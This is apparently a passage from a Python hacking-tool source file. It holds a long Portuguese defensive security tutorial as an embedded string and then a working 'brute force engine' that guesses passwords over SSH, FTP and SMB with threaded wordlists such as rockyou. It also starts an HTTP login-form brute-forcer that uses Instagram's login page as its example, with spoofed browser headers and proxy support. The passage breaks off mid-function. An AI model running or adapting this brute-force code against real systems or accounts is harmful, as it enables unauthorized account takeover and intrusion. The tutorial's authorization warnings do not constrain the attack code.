        print("Primeiros bytes:", conteudo[:100])
except urllib.error.HTTPError as erro:
    print("Erro HTTP:", erro.code)
except urllib.error.URLError as erro:
    print("Falha na URL/rede:", erro.reason)
except TimeoutError:
    print("Tempo limite excedido")

Não aceite URLs arbitrárias de usuários sem controles. Um serviço que busca URLs pode ser abusado para alcançar localhost, redes privadas ou serviços de metadados (SSRF). Considere bloquear destinos não autorizados, validar todos os endereços resolvidos, controlar redirecionamentos e aplicar restrições de rede.

4.6 json — ler e salvar relatórios

import json

relatorio = {
    "ferramenta": "Auditoria Python",
    "status": "concluido",
    "autorizado": True
}

with open("relatorio.json", "w", encoding="utf-8") as arquivo:
    json.dump(relatorio, arquivo, indent=4, ensure_ascii=False)

with open("relatorio.json", encoding="utf-8") as arquivo:
    dados = json.load(arquivo)

print(dados["status"])

JSON é um formato de dados, não um formato seguro por si só. Valide valores antes de usá-los em caminhos, comandos ou consultas.

4.7 secrets, random e string — aleatoriedade

import secrets
import string
import random

alfabeto = string.ascii_letters + string.digits
token = "".join(secrets.choice(alfabeto) for _ in range(32))
print("Token de demonstração:", token)

numero_de_teste = random.randint(1, 100)
print("Número de simulação:", numero_de_teste)

Use secrets para tokens e valores de segurança; random é para simulações e usos não criptográficos. Não registre tokens reais em logs. Para um token hexadecimal, secrets.token_hex(32) gera 32 bytes aleatórios representados por 64 caracteres hexadecimais.

4.8 hashlib — hashes e integridade

import hashlib

mensagem = b"arquivo de teste"
print(hashlib.sha256(mensagem).hexdigest())

def calcular_sha256(caminho):
    digest = hashlib.sha256()
    with open(caminho, "rb") as arquivo:
        for bloco in iter(lambda: arquivo.read(65536), b""):
            digest.update(bloco)
    return digest.hexdigest()

print(calcular_sha256("relatorio.json"))

SHA-256 é útil para integridade e identificação. Hash não é criptografia reversível. Não armazene senhas com SHA-256 simples; use Argon2id, scrypt ou PBKDF2 com salt e parâmetros apropriados.

4.9 base64 — codificação

import base64

mensagem = "Laboratório de segurança"
codificado = base64.b64encode(mensagem.encode("utf-8"))
original = base64.b64decode(codificado).decode("utf-8")

print(codificado.decode("ascii"))
print(original)

Base64 não cifra nem protege segredos. É apenas uma forma de representar bytes como texto.

4.10 os, sys e platform — ambiente e arquivos

import os
import sys
import platform

print("Diretório:", os.getcwd())
print("Usuário:", os.environ.get("USER", "desconhecido"))
print("Python:", sys.version)
print("Executável:", sys.executable)
print("Sistema:", platform.system())
print("Arquitetura:", platform.machine())

Variáveis de ambiente podem conter credenciais. Evite imprimir todas as variáveis em logs. Para caminhos de arquivos, prefira pathlib em projetos novos e valide se o caminho está dentro do diretório autorizado.

4.11 subprocess — executar programas com segurança

import subprocess
import sys

resultado = subprocess.run(
    [sys.executable, "--version"],
    capture_output=True,
    text=True,
    timeout=5,
    check=False
)

print(resultado.stdout or resultado.stderr)
print("Código de saída:", resultado.returncode)

Passe o programa e seus argumentos em uma lista.

Evite shell=True quando houver entrada externa.

Defina timeout e trate falhas.

Não execute comandos desconhecidos com sudo.

Não construa comandos concatenando texto fornecido por usuários.

4.12 threading — tarefas concorrentes

import threading
import time

def tarefa():
    print("Tarefa iniciada")
    time.sleep(1)
    print("Tarefa finalizada")

thread = threading.Thread(target=tarefa)
thread.start()
print("O programa continua")
thread.join()
print("Tarefa concluída")

Threads podem ajudar em operações de I/O. Limite a concorrência e proteja recursos compartilhados quando várias threads alterarem os mesmos dados.

4.13 http.server e socketserver — servidor local

from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

PASTA = Path("./arquivos_teste").resolve()
PASTA.mkdir(exist_ok=True)

handler = partial(SimpleHTTPRequestHandler, directory=str(PASTA))
servidor = ThreadingHTTPServer(("127.0.0.1", 8000), handler)

print("Servidor local: http://127.0.0.1:8000")
try:
    servidor.serve_forever()
except KeyboardInterrupt:
    print("\nEncerrando...")
finally:
    servidor.server_close()

Esse exemplo compartilha somente a pasta arquivos_teste configurada no código e escuta em loopback. Ainda assim, não o use como servidor de produção: o servidor padrão é destinado a desenvolvimento e testes.

4.14 textwrap — formatar mensagens

import textwrap

texto = "Cibersegurança exige estudo, autorização e registro dos testes."
print(textwrap.fill(texto, width=50))

4.15 phonenumbers — números internacionais

Instalação: python -m pip install phonenumbers. A biblioteca interpreta metadados de numeração; não revela GPS, endereço residencial nem a localização atual de uma pessoa.

import phonenumbers
from phonenumbers import geocoder, carrier

numero = phonenumbers.parse("+351 927 317 466", None)

print("Possível:", phonenumbers.is_possible_number(numero))
print("Válido segundo os metadados:", phonenumbers.is_valid_number(numero))
print("Formato internacional:", phonenumbers.format_number(
    numero, phonenumbers.PhoneNumberFormat.INTERNATIONAL
))
print("Descrição regional:", geocoder.description_for_number(numero, "pt"))
print("Operadora (se disponível):", carrier.name_for_number(numero, "pt"))

A validade depende dos metadados da biblioteca e não prova que o número esteja ativo ou pertença a uma pessoa específica. Portabilidade pode tornar a informação de operadora imprecisa.

5. Projeto completo: auditoria HTTP/TLS e relatório JSON

Este protótipo combina resolução DNS, validação de formato de URL, inspeção de TLS, consulta de alguns cabeçalhos e geração de um relatório. Use apenas alvos autorizados. A versão didática não é um scanner completo nem uma garantia de segurança.

5.1 Código completo

import datetime
import hashlib
import ipaddress
import json
import socket
import ssl
import time
import urllib.error
import urllib.request
from urllib.parse import urlparse


def resolver_dominio(dominio):
    try:
        resultados = socket.getaddrinfo(
            dominio, None, type=socket.SOCK_STREAM
        )
        ips = sorted({item[4][0] for item in resultados})
        return {"enderecos": ips}
    except socket.gaierror as erro:
        return {"erro": str(erro)}


def verificar_tls(dominio, porta):
    contexto = ssl.create_default_context()
    try:
        with socket.create_connection((dominio, porta), timeout=5) as sock:
            with contexto.wrap_socket(
                sock, server_hostname=dominio
            ) as segura:
                return {
                    "conectado": True,
                    "versao": segura.version(),
                    "certificado": segura.getpeercert()
                }
    except (OSError, ssl.SSLError) as erro:
        return {"conectado": False, "erro": str(erro)}


def consultar_http(url):
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "AuditoriaDefensivaPython/1.0"}
    )
    cabecalhos_interesse = [
        "Content-Type",
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "X-Content-Type-Options",
        "X-Frame-Options",
        "Referrer-Policy"
    ]
    try:
        with urllib.request.urlopen(req, timeout=8) as resposta:
            return {
                "status": resposta.status,
                "cabecalhos": {
                    nome: resposta.headers.get(nome)
                    for nome in cabecalhos_interesse
                }
            }
    except urllib.error.HTTPError as erro:
        return {"status": erro.code, "erro": "Resposta HTTP de erro"}
    except (urllib.error.URLError, TimeoutError, OSError) as erro:
        return {"erro": str(erro)}


def sha256_arquivo(caminho):
    digest = hashlib.sha256()
    with open(caminho, "rb") as arquivo:
        for bloco in iter(lambda: arquivo.read(65536), b""):
            digest.update(bloco)
    return digest.hexdigest()


def analisar_url(url):
    partes = urlparse(url)
    if partes.scheme not in ("http", "https"):
        raise ValueError("Use uma URL HTTP ou HTTPS.")
    if not partes.hostname:
        raise ValueError("A URL precisa conter um host.")
    if partes.username or partes.password:
        raise ValueError("Não inclua credenciais na URL.")
    try:
        porta = partes.port
    except ValueError:
        raise ValueError("Porta inválida.") from None

    dominio = partes.hostname
    relatorio = {
        "url": url,
        "esquema": partes.scheme,
        "dominio": dominio,
        "data_utc": datetime.datetime.now(
            datetime.timezone.utc
        ).isoformat(),
        "dns": resolver_dominio(dominio)
    }

    if partes.scheme == "https":
        relatorio["tls"] = verificar_tls(dominio, porta or 443)

    relatorio["http"] = consultar_http(url)
    return relatorio


def main():
    print("=== AUDITORIA DEFENSIVA ===")
    url = input("URL autorizada: ").strip()
    inicio = time.perf_counter()

    try:
        relatorio = analisar_url(url)
        relatorio["duracao_segundos"] = round(
            time.perf_counter() - inicio, 3
        )
        print(json.dumps(relatorio, indent=2, ensure_ascii=False))
        with open("relatorio_auditoria.json", "w", encoding="utf-8") as arquivo:
            json.dump(relatorio, arquivo, indent=2, ensure_ascii=False)
        print("Relatório salvo em relatorio_auditoria.json")
    except (ValueError, OSError) as erro:
        print("Não foi possível concluir:", erro)

    caminho = input("Arquivo local para SHA-256 (Enter para pular): ").strip()
    if caminho:
        try:
            print("SHA-256:", sha256_arquivo(caminho))
        except OSError as erro:
            print("Falha ao ler arquivo:", erro)


if __name__ == "__main__":
    main()

5.2 Executar

cd ~/cyberseguranca-python
source .venv/bin/activate
python auditoria.py

Teste com https://example.com/ ou com uma aplicação de laboratório. O script faz uma requisição ao destino informado e pode seguir redirecionamentos conforme o comportamento padrão do cliente HTTP. Não use entradas de terceiros sem validação e controles adicionais.

5.3 Interpretar os resultados

Nota técnica: para produção, a ferramenta precisa de controles robustos de SSRF, restrição de destinos, validação de DNS e redirecionamentos, limites de tamanho, logging seguro e testes automatizados. O resultado deve ser tratado como sinal inicial, não como laudo conclusivo.

6. Linux/Kali: verificações defensivas

whoami
id
uname -a
ip address
ip route
ss -lnt

sudo apt update
apt list --upgradable

O primeiro comando atualiza os índices de pacotes; o segundo lista atualizações disponíveis. Revise mudanças e faça backup antes de atualizar sistemas críticos.

6.1 Checklist de hardening

Trabalhe sem privilégios administrativos por padrão.

Mantenha sistema e aplicações atualizados.

Desative serviços que não são necessários.

Limite serviços de rede a interfaces e origens necessárias.

Use autenticação multifator quando possível.

Proteja backups e teste a restauração.

Revise permissões de arquivos e diretórios.

Guarde segredos em mecanismos apropriados, não no código-fonte.

Monitore logs e investigue eventos incomuns.

Não execute scripts desconhecidos com sudo.

7. Criptografia, hashes e credenciais

7.1 Não confunda os conceitos

7.2 Boas práticas para senhas e tokens

Nunca armazene senhas em texto puro.

Use uma função apropriada para senhas com salt e parâmetros atuais.

Gere tokens com secrets, não com random.

Defina expiração e revogação de tokens.

Não inclua segredos em logs, prints, capturas de tela ou repositórios.

Rotacione credenciais expostas e revise onde foram usadas.

AES-GCM é um modo de criptografia autenticada: além da confidencialidade, detecta alterações nos dados. A segurança depende de implementação correta, gerenciamento de chaves e, em particular, de não reutilizar um nonce com a mesma chave.

8. Segurança web e APIs

8.1 Controles básicos

Autenticação: confirmar a identidade de quem acessa.

Autorização: verificar se essa identidade pode executar a ação.

Validação: verificar formato, tamanho, tipo e contexto dos dados.

Limitação de taxa: reduzir abuso e consumo excessivo de recursos.

Tratamento de erros: evitar expor stack traces, segredos e detalhes internos.

Transporte seguro: usar HTTPS/TLS com validação adequada.

Logs: registrar eventos úteis sem armazenar senhas ou tokens.

Dependências: atualizar bibliotecas e acompanhar avisos de segurança.

8.2 Validação de entrada em Python

def validar_idade(valor):
    try:
        idade = int(valor)
    except (ValueError, TypeError):
        return False
    return 0 <= idade <= 120

print(validar_idade("18"))           
print(validar_idade("texto"))         
print(validar_idade("-5"))            

Validação não substitui autorização. Uma API também precisa garantir que um usuário só acesse os registros que lhe pertencem e que cada operação seja permitida.

8.3 Arquivos e caminhos

Não confie em nomes de arquivo fornecidos por usuários. Restringir extensões não basta: valide o destino real, mantenha os arquivos dentro de uma pasta autorizada, controle permissões e evite seguir caminhos que escapem do diretório previsto.

9. Logs e resposta a incidentes

Logs ajudam a reconstruir eventos, identificar falhas e detectar atividades suspeitas. Um log útil registra horário com fuso, evento, resultado e identificador de correlação, sem expor senhas, tokens ou dados pessoais desnecessários.

9.1 Processo inicial de resposta

Identificar o evento e registrar quando foi percebido.

Preservar evidências e evitar alterações desnecessárias.

Conter o problema de forma proporcional e autorizada.

Investigar a causa e o alcance com registros confiáveis.

Erradicar a causa, aplicar correções e recuperar o serviço.

Documentar as lições aprendidas e melhorar os controles.

Se houver um incidente real, siga o plano da organização e envolva os responsáveis. Não apague logs nem faça mudanças que possam destruir evidências sem orientação.

10. Laboratórios e referências

Utilize os laboratórios conforme os termos e regras de cada plataforma. Não reproduza testes em sistemas externos sem autorização explícita.

11. Plano de estudo sugerido

12. Exercícios

Use ipaddress para validar um IPv4 e um IPv6; trate ValueError.

Explique por que resolver um domínio não prova que o serviço está acessível.

Calcule o SHA-256 de um arquivo próprio e repita após modificá-lo. Compare os resultados.

Gere um token com secrets e explique por que random não é adequado para autenticação.

Consulte os cabeçalhos de uma aplicação de laboratório e explique por que a ausência de um cabeçalho não prova sozinha uma vulnerabilidade.

Altere o projeto para registrar a duração e a data UTC de cada análise.

Crie uma lista de permissões de domínios para que seu laboratório só aceite destinos previamente aprovados.

13. Glossário

Conclusão

Aprender cibersegurança é um processo contínuo. Para cada conceito, escreva um pequeno programa, execute-o em laboratório, leia os resultados e documente limites e possíveis erros. O objetivo é compreender o que a ferramenta realmente comprova — e o que ela não comprova — para tomar decisões seguras.

Regra de ouro: autorização, escopo, segurança dos dados e documentação fazem parte do trabalho técnico, não são detalhes opcionais.

12. HTML e segurança de páginas web

HTML (HyperText Markup Language) é a linguagem de marcação usada para estruturar o conteúdo de páginas web. Ele organiza títulos, parágrafos, links, imagens, formulários, tabelas e outras partes da página. HTML não é, por si só, uma linguagem de programação: ele descreve a estrutura do conteúdo. CSS controla a apresentação visual, e JavaScript adiciona comportamento e interatividade.

12.1 Estrutura básica de um documento HTML

Exemplo simples (salve como index.html e abra no navegador):

<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Minha página de teste</title>
</head>
<body>
  <h1>Olá, mundo!</h1>
  <p>Esta é uma página HTML para estudar em laboratório.</p>
  <a href="https://example.com">Visitar um exemplo</a>
</body>
</html>

12.2 Tags HTML mais comuns

<html>: elemento raiz do documento.

<head>: metadados, título e configurações que não são o conteúdo principal visível.

<meta charset="utf-8">: declara a codificação de caracteres.

<title>: título mostrado na aba do navegador.

<body>: conteúdo principal da página.

<h1> a <h6>: títulos em diferentes níveis.

<p>: parágrafo.

<a href="...">: link para outra página ou recurso.

<ul>, <ol> e <li>: listas não ordenadas, ordenadas e itens.

<form>, <label>, <input> e <button>: elementos de formulários.

<div> e <span>: contêineres genéricos, usados quando não há um elemento semântico mais adequado.

<script>: inclui ou referencia JavaScript; use com cuidado e evite inserir código não confiável.

12.3 HTML e cibersegurança

HTML ajuda quem estuda segurança a entender como o navegador apresenta conteúdo e formulários. Ao inspecionar uma página, verifique se os campos têm rótulos claros, se os links apontam para destinos esperados e se a página não tenta induzir o usuário a fornecer dados sensíveis. A aparência de uma página pode ser copiada; confira o domínio e não confie apenas no logotipo, nas cores ou no cadeado do navegador.

HTML sozinho não protege dados enviados por formulários. A aplicação do servidor deve validar os dados, controlar permissões e evitar registrar senhas ou tokens em logs. Informações sensíveis devem ser transmitidas por HTTPS, mas HTTPS não prova que um site é honesto: ele protege a conexão com o domínio acessado.

12.4 Formulários seguros

<form action="/contato" method="post">
  <label for="email">E-mail:</label>
  <input id="email" name="email" type="email" autocomplete="email" required>
  <button type="submit">Enviar</button>
</form>

O atributo required oferece uma validação básica no navegador, mas não substitui a validação no servidor. O servidor precisa tratar qualquer entrada como não confiável, validar formato e tamanho, aplicar limites de uso quando apropriado e armazenar apenas o necessário. Não coloque senhas, chaves de API ou tokens dentro do HTML enviado ao navegador.

12.5 Segurança contra XSS

Cross-Site Scripting (XSS) ocorre quando uma aplicação inclui conteúdo não confiável em uma página de forma que o navegador o interprete como código. A defesa depende do contexto: escape/encode de saída apropriado, APIs seguras de manipulação do DOM, evitar inserir texto não confiável como HTML e aplicar uma Content Security Policy (CSP) bem planejada. Não confie em filtros improvisados como única defesa.

// Preferível para mostrar texto fornecido pelo usuário:
element.textContent = textoDoUsuario;

// Evite inserir conteúdo não confiável como HTML:
element.innerHTML = textoDoUsuario; // pode ser perigoso

12.6 Cabeçalhos HTTP úteis

Content-Security-Policy (CSP): limita de onde certos recursos podem ser carregados e reduz algumas classes de risco.

Strict-Transport-Security (HSTS): orienta navegadores compatíveis a usar HTTPS para o domínio por um período definido.

X-Content-Type-Options: nosniff: reduz interpretações indevidas de tipos de conteúdo.

Referrer-Policy: controla quanto da informação de referência é enviada a outros sites.

Permissions-Policy: permite limitar o uso de determinados recursos do navegador.

A configuração correta depende da aplicação. Teste mudanças em ambiente de desenvolvimento e confira se elas não quebram funcionalidades legítimas.

12.7 Ler HTML com Python

Para projetos próprios ou páginas públicas que você tem autorização para analisar, Python pode buscar uma página e extrair informações. A biblioteca padrão permite baixar conteúdo HTTP; para interpretar HTML com mais facilidade, é comum usar Beautiful Soup, instalada separadamente.

from urllib.request import Request, urlopen
from urllib.parse import urlparse

url = "https://example.com"
parsed = urlparse(url)

if parsed.scheme != "https" or not parsed.netloc:
    raise ValueError("Use uma URL HTTPS válida")

req = Request(url, headers={"User-Agent": "Estudo-Ciberseguranca/1.0"})
with urlopen(req, timeout=10) as response:
    html = response.read(500_000).decode("utf-8", errors="replace")
    print("Status:", response.status)
    print("Content-Type:", response.headers.get("Content-Type"))
    print("HTML recebido (início):")
    print(html[:1000])

Use apenas em alvos permitidos, respeite os termos do serviço, limite requisições e não tente contornar autenticação ou controles de acesso. O exemplo limita a leitura a 500 mil bytes para evitar consumir conteúdo ilimitado.

12.8 Checklist de revisão de uma página

O domínio está escrito corretamente e corresponde ao site esperado?

A página usa HTTPS e não apresenta erros de certificado?

O formulário explica quais dados são necessários e por quê?

A aplicação valida entradas também no servidor?

Dados sensíveis ficam fora do HTML público, do JavaScript entregue ao navegador e dos logs?

O conteúdo fornecido por usuários é exibido como texto seguro e não executado como HTML?

Os cabeçalhos de segurança foram configurados e testados?

Há política de privacidade e coleta mínima de dados?

13. Projeto prático: página HTML local para estudo

Crie uma pasta chamada html-lab e salve o código HTML da seção 12.1 como index.html. Abra o arquivo no navegador. Depois, altere o título, acrescente uma lista e crie um formulário que não envie dados a um servidor real. Use as ferramentas de desenvolvedor do navegador para inspecionar a estrutura. Não use dados pessoais reais nos testes.

Princípio | Significado | Exemplo

Confidencialidade | Somente pessoas autorizadas acessam os dados. | Criptografar um backup.

Integridade | Os dados não são alterados sem autorização. | Comparar o SHA-256 de um arquivo.

Disponibilidade | Sistemas e dados estão acessíveis quando necessários. | Backups testados e redundância.

Termo | Definição | Exemplo

Ativo | Recurso que precisa ser protegido. | Servidor, conta ou base de dados.

Ameaça | Evento ou agente capaz de causar dano. | Phishing, falha elétrica ou malware.

Vulnerabilidade | Fraqueza que pode ser explorada. | Biblioteca desatualizada.

Risco | Combinação de probabilidade e impacto. | Exposição de dados pessoais.

Mitigação | Medida que reduz o risco. | Corrigir, restringir acesso ou monitorar.

Hardening | Redução da superfície de ataque. | Desativar serviços desnecessários.

Pentest | Teste de segurança com autorização e escopo. | Avaliar uma aplicação de laboratório.

Porta | Serviço | Uso típico

22/TCP | SSH | Administração remota segura.

53/TCP/UDP | DNS | Resolução de nomes.

80/TCP | HTTP | Web sem TLS.

443/TCP | HTTPS | Web protegida por TLS.

445/TCP | SMB | Compartilhamento em redes Windows.

3306/TCP | MySQL | Banco de dados.

8000/TCP | Variável | Servidor de desenvolvimento em alguns projetos.

Campo | O que significa | O que não prova

DNS | O nome foi resolvido em endereços. | Que o serviço está disponível ou é confiável.

TLS | A negociação TLS passou pela validação padrão. | Que a aplicação não possui vulnerabilidades.

Status HTTP | Código de resposta recebido. | Que o conteúdo é seguro.

Cabeçalhos | Cabeçalhos observados na resposta. | Que sua ausência, isoladamente, é uma vulnerabilidade confirmada.

SHA-256 | Resumo do arquivo naquele momento. | Que o arquivo é seguro ou confiável sem uma referência de comparação.

Comando | Uso

whoami | Mostra o usuário atual.

id | Mostra UID, GID e grupos.

uname -a | Exibe informações do kernel.

ip address | Mostra interfaces e endereços.

ip route | Mostra a tabela de rotas.

ss -lnt | Mostra sockets TCP em escuta.

Técnica | Objetivo | Exemplo

Codificação | Representar dados em outro formato. | Base64.

Hash | Gerar um resumo para comparação. | SHA-256.

Criptografia | Proteger conteúdo usando chave. | AES-GCM.

Hash de senha | Armazenar verificadores resistentes a tentativas. | Argon2id, scrypt ou PBKDF2.

Recurso | O que estudar | Endereço

Documentação Python | Módulos, sintaxe, exceções e biblioteca padrão. | https://docs.python.org/3/

OWASP | Guias e projetos de segurança de aplicações. | https://owasp.org/

OWASP Juice Shop | Aplicação deliberadamente vulnerável para laboratório. | https://owasp.org/www-project-juice-shop/

Web Security Academy | Laboratórios guiados de segurança web. | https://portswigger.net/web-security

OverTheWire Bandit | Terminal Linux e fundamentos. | https://overthewire.org/wargames/bandit/

NIST Cybersecurity Framework | Gestão de riscos de cibersegurança. | https://www.nist.gov/cyberframework

MITRE ATT&CK | Táticas e técnicas observadas de adversários. | https://attack.mitre.org/

Etapa | Tópicos | Projeto de prática

1. Fundamentos | Python básico, funções, arquivos e exceções. | Validador de entrada e relatório JSON.

2. Redes | IP, DNS, TCP/UDP, HTTP e TLS. | Consulta DNS e diagnóstico TLS.

3. Integridade | Hash, arquivos, datas e logs. | Inventário de hashes de arquivos próprios.

4. Linux | Permissões, processos, serviços e atualizações. | Checklist de hardening da própria máquina.

5. Segurança web | Sessões, autorização, validação e cabeçalhos. | Aplicação local de laboratório e relatório.

6. Resposta | Logs, evidências e documentação. | Relatório de incidente simulado.

Termo | Definição

API | Interface que permite a sistemas trocarem dados e operações.

CVE | Identificador público de uma vulnerabilidade conhecida.

CVSS | Sistema de pontuação de severidade de vulnerabilidades.

Firewall | Controle de tráfego baseado em regras.

IOC | Indicador de comprometimento, como hash, domínio ou endereço IP associado a uma investigação.

Log | Registro de eventos.

MFA | Autenticação multifator.

Patch | Atualização que corrige falhas ou problemas.

SSRF | Falha em que uma aplicação pode ser induzida a fazer requisições a destinos não pretendidos.

TLS | Protocolo que protege comunicações em rede.

Pentest | Teste autorizado de segurança com escopo definido.
''')

def brute_force():
    import concurrent.futures
    import threading
    import time
    import requests
    import re
    import json
    import os
    import sys
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

    print("\n" + "="*50)
    print(" 🗝️ THECELTIC BRUTE FORCE ENGINE [PRODUCTION v2]")
    print("="*50)
    print("""
    [1] SSH Brute Force
    [2] FTP Brute Force
    [3] SMB Brute Force
    [4] HTTP Form Brute Force (Universal/Smart)
    [5] Gerador de Wordlist (Combinação)
    [0] Voltar ao Menu
    """)
    
                                     
    stats = {"total": 0, "success": 0, "errors": 0}
    stop_event = threading.Event()
    lock = threading.Lock()
    found_credentials = []

    def update_stats(key, increment=1):
        with lock:
            stats[key] += increment

    def report_metrics(elapsed_time):
        with lock:
            total = stats["total"]
            success = stats["success"]
            errors = stats["errors"]
        if total == 0: 
            return
        rate = total / elapsed_time if elapsed_time > 0 else 0
        print(f"\r[PROGRESS] {total} testados | {success} OK | {errors} ERR | {rate:.2f} req/s", end="", flush=True)

    def get_wordlist_content():
        DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
        print("\n[INFO] Opções de Wordlist:")
        print("[1] Usar /usr/share/wordlists/rockyou.txt (Completo)")
        print("[2] Informar senhas manualmente (separadas por vírgula)")
        print("[3] Wordlist padrão curta (Top 20 comuns)")
        print("[4] Carregar arquivo .txt personalizado")
        
        choice = input("Escolha (1-4): ").strip()
        
        if choice == '1' and os.path.exists(DEFAULT_WORDLIST):
            print("[INFO] Carregando RockYou em memória...")
            with open(DEFAULT_WORDLIST, 'r', encoding='utf-8', errors='ignore') as f:
                                                   
                return list(set(line.strip() for line in f if line.strip()))
        elif choice == '2':
            raw = input("Digite as senhas (separadas por vírgula): ").strip()
            return [s.strip() for s in raw.split(',') if s.strip()]
        elif choice == '4':
            file_path = input("Caminho do arquivo .txt: ").strip()
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    return list(set(line.strip() for line in f if line.strip()))
            else:
                print("[ERRO] Arquivo não encontrado. Usando lista padrão.")
                return ["admin", "root", "user", "password", "123456", "letmein", "welcome", "monkey", "dragon", "master", "123456789", "12345678"]
        else:
            return ["admin", "root", "user", "password", "123456", "letmein", "welcome", "monkey", "dragon", "master", "123456789", "12345678"]

    def run_parallel_attack(candidates, test_func, service_name, max_workers=10, delay_per_request=0.05):
        """
        Executa o ataque em paralelo.
        """
        start_time_local = time.time()
        total_candidates = len(candidates)
        print(f"[INFO] Inicializando {service_name} Brute Force...")
        print(f"[INFO] Total de combinações: {total_candidates}")
        print(f"[INFO] Workers: {max_workers} | Delay: {delay_per_request}s")
        
        if total_candidates == 0:
            print("[!] Nenhuma combinação para testar.")
            return []

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                                         
            future_to_cand = {executor.submit(test_func, cand): cand for cand in candidates}
            
                                                
            for future in concurrent.futures.as_completed(future_to_cand):
                                                                      
                if stop_event.is_set():
                    for f in future_to_cand:
                        f.cancel()
                    break
                
                candidate = future_to_cand[future]
                try:
                    result = future.result()
                    if result:
                        update_stats("success")
                        found_credentials.append(result)
                        print(f"\n{GREEN}[SUCESSO]{RESET} {service_name} - Usuário: {result['user']} | Senha: {result['password']}")
                        
                                                  
                        stop_event.set()
                        break
                        
                    else:
                        update_stats("total")
                        elapsed = time.time() - start_time_local
                        report_metrics(elapsed)
                        
                except Exception as e:
                    update_stats("errors")
                    update_stats("total")
                    elapsed = time.time() - start_time_local
                    report_metrics(elapsed)
                    with lock:
                        if stats["errors"] % 100 == 0:
                            print(f"\n[WARN] {stats['errors']} erros. Último: {type(e).__name__}: {str(e)[:50]}")
                
                               
                if not stop_event.is_set():
                    time.sleep(delay_per_request)

                       
        print("\n" + "="*30)
        print(f"RESUMO FINAL ({service_name})")
        print(f"Testados: {stats['total']}")
        print(f"Sucessos: {stats['success']}")
        print(f"Erros: {stats['errors']}")
        if found_credentials:
            print("Credenciais Válidas:")
            for r in found_credentials:
                print(f"  {r['user']} : {r['password']}")
        else:
            print("Nenhuma credencial válida encontrada.")
        print("="*30)
        return found_credentials

    try:
        sub_op = int(input("Escolha um serviço: "))
        
        if sub_op == 0:
            return

        users_input = input("Usuários (separados por vírgula, ENTER para padrão): ").strip() or "root,admin,user,test,administrator,ftp,anonymous"
        users = [u.strip() for u in users_input.split(',') if u.strip()]
        passwords = get_wordlist_content()
        
        if not users or not passwords:
            print("[!] Usuários ou senhas vazios.")
            return

                                                       
        if len(users) * len(passwords) > 2000000:
            print("[WARN] Combinações muito grandes (>2M). Isso pode levar horas.")
            confirm = input("Continuar mesmo assim? (s/n): ").lower()
            if confirm != 's':
                return

        candidates = [{"user": u, "password": p} for u in users for p in passwords]

        if sub_op == 1:      
            target = input("Alvo (IP/Dominio): ").strip()
            if not target: return
            port_str = input("Porta SSH (ENTER para 22): ").strip() or "22"
            try:
                port = int(port_str)
            except ValueError:
                print("[ERRO] Porta inválida.")
                return

            def test_ssh(cand):
                try:
                    paramiko = import_paramiko()
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        target, port=port, username=cand['user'], password=cand['password'],
                        timeout=5, allow_agent=False, look_for_keys=False,
                        banner_timeout=5, auth_timeout=5
                    )
                    client.close()
                    return cand
                except paramiko.ssh_exception.AuthenticationException:
                    return None
                except Exception:
                    raise

            run_parallel_attack(candidates, test_ssh, "SSH", max_workers=20)

        elif sub_op == 2:      
            target = input("Alvo (IP/Dominio): ").strip()
            if not target: return
            port_str = input("Porta FTP (ENTER para 21): ").strip() or "21"
            try:
                port = int(port_str)
            except ValueError:
                print("[ERRO] Porta inválida.")
                return

            def test_ftp(cand):
                try:
                    import ftplib
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=5)
                    ftp.login(cand['user'], cand['password'])
                    ftp.quit()
                    return cand
                except ftplib.error_perm:
                    return None
                except Exception:
                    raise

            run_parallel_attack(candidates, test_ftp, "FTP", max_workers=20)

        elif sub_op == 3:      
            target = input("Alvo (IP/Dominio): ").strip()
            if not target: return
                                               
            port_str = input("Porta SMB (ENTER para 445): ").strip() or "445"
            try:
                port = int(port_str)
            except ValueError:
                print("[ERRO] Porta inválida.")
                return

            def test_smb(cand):
                try:
                    import smbprotocol.connection    # type: ignore[import-not-found]                              
                    import smbprotocol.session      # type: ignore[import-not-found]                                                           
                    
                    conn = smbprotocol.connection.Connection.create(target, port)
                    conn.connect()
                    session = smbprotocol.session.Session.create(conn, cand['user'], cand['password'])
                    session.connect()
                    session.close()
                    conn.close()
                    return cand
                    
                except ModuleNotFoundError:
                    raise ModuleNotFoundError("Biblioteca 'smbprotocol' não instalada. Rode: pip install smbprotocol")
                except Exception:
                    raise

            run_parallel_attack(candidates, test_smb, "SMB", max_workers=20)

        elif sub_op == 4:                                   
            target = input("URL do formulário (ex: https://www.instagram.com/accounts/login/): ").strip()
            if not target: return
            
            print("[INFO] Configurando Motor Smart (Thread-Safe)...")
            
            user_field = input("Nome do campo HTML de usuário (ENTER para 'username'): ").strip() or "username"
            pass_field = input("Nome do campo HTML de senha (ENTER para 'password'): ").strip() or "password"
            
                                   
            use_proxy = input("Usar Proxy? (s/n): ").lower() == 's'
            proxy_url = ""
            if use_proxy:
                proxy_url = input("URL do Proxy (ex: http://user:pass@host:port): ").strip()
                if proxy_url and "://" not in proxy_url:
                    proxy_url = "http://" + proxy_url

                                       
            base_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": target.split('/')[0] + "//" + target.split('/')[2],
                "Referer": target,
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            }

                                                            
            print("[INFO] Realizando Fingerprinting inicial para extrair tokens...")
            initial_session = requests.Session()
            if use_proxy:
                initial_session.proxies = {"http": proxy_url, "https": proxy_url}
            
            hidden_fields = {}                                                          
            failure_signature = {}
            
            try:
